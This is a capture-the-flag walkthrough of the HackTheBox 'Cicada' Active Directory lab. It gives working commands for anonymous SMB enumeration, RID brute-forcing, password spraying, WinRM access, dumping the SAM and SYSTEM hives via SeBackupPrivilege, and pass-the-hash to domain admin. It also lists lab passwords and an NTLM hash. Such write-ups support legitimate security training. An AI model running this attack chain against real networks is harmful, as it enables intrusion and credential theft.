---
title: "HackTheBox - Cicada"
date: 2025-04-25
draft: false
series: "HTB Machines"
tags: ["active directory", "hackthebox", "windows"]
---


# Cicada Walkthrough

## 1. Initial Nmap Enumeration

Identify open ports and services on the target.

```bash
# Discover some TCP ports
nmap -sVC -T4 10.10.11.35 -oA nmapScan-out
```



**Key findings:**

![nmap](/images/cicada-nmap.png)

---

## 2. SMB Anonymous Enumeration

### 2.1 Check SMB shares as anonymous

```bash
smbclient -L 10.10.11.35 -N
```

![anony](/images/cicada-smbanony.png)

- `HR` share is accessible.

### 2.2 Download `Notice from HR.txt` from HR share

```bash
smbclient //10.10.11.35/HR -N
> ls
> mget *
```

![anony](/images/cicida-HR-ls2.png)

Checking out the content:
![anony](/images/cicada-firstpass.png)

> **Discovery:** The file contains a password: `Cicada$M6Corpb*@Lp#nZp!8`

---

## 3. RID Brute-Force to Enumerate Users

Using NetExec (`nxc`) to perform RID brute force without credentials.

```bash
nxc smb 10.10.11.35 -u anonymous -p '' --rid-brute
```

![rid brute](/images/cicada-ridbrute.png)

Filter only user accounts and save to `users.txt`:

```bash
nxc smb 10.10.11.35 -u anonymous -p '' --rid-brute | grep "SidTypeUser" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt

```

---

## 4. Password Spraying with Valid Users

Perform a password spray using the discovered password `Cicada$M6Corpb*@Lp#nZp!8` against the user list.

```bash
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![spray](/images/cicada-spray.png)

> **Success:** Credentials for `michael.wrightson` found.

---

## 5. Attempt Remote Shell with Evil-WinRM

Try to get a shell via WinRM using the valid credentials.

```bash
evil-winrm -i 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
> **Result:** Access denied.

---

## 6. Check Additional Users with valid credentials

```bash
nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
![find users](/images/cicada-users.png)

> **Discovery:** User `david.orelious` found with the password `aRt$Lp#7t*VQ!3` on his description.


## 7. List shares with the new user

Initially, we identified a DEV share, but access was denied. Let's try with the new user:

```bash
smbclient //10.10.11.35/DEV -U david.orelious
> aRt$Lp#7t*VQ!3
> dir
> mget *
```
![dev share](/images/cicada-dev.png)

![backup file](/images/cicada-backupfile.png)

**Discovery:** Powershell backup file with new credentials `emily.oscars:Q!3@Lp#M6b*7t*Vt`.

---


## 9. WinRM Access with New User Account

```bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

> **Success:** Shell as `emily.oscars`.

---

## 10. Privilege Escalation

Check current privileges:

```powershell
whoami /priv
```

![privesc](/images/cicada-priv.png)

> **SeBackupPrivilege** is `Enabled`.

---

## 11. Abuse SeBackupPrivilege for Lateral/Local Escalation

### 11.1 Dump SAM and SYSTEM hives

```powershell
# Create directory for dumps
mkdir C:\temp

# Save registry hives
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Download files with "download" from evil-winrm
download sam
download system
```

### 11.2 Extract NTLM hashes offline

```bash
impacket-secretsdump -sam sam -system system LOCAL > hashes.txt
```
![dump hashes](/images/cicada-hash.png)

### 11.3 Pass-the-Hash to Domain Controller

Use Evil-WinRM with the extracted Administrator NTLM hash:

```bash
evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```
![alt text](/images/cicada-admin.png)


> **Result:** Shell as **Domain Administrator** on the DC.

---

*End of Walkthrough*